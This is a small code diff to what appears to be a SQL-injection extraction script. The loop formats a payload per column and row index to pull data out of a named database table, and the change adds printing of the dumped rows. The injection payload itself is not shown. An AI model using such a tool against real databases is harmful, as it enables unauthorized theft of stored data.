@@ -55,7 +55,7 @@ if table_name in tables_name:
     datas = []
     for i in range(50):
         out_break = False
-        print(i)
+#        print(i)
         data = []
         for item in columns_name:
             payload_step = payload.format(item,db_name,table_name,i)
@@ -73,8 +73,9 @@ if table_name in tables_name:
         for j in data:
             data_summary = data_summary + " -- " + j + " " 
         datas.append(data_summary)
-
-    
+    print("The data in the table {}:".format(table_name))
+    for data in datas:
+        print("[+] ",data)    
 else:
     print("The table you want is not in this database. Exit")
 
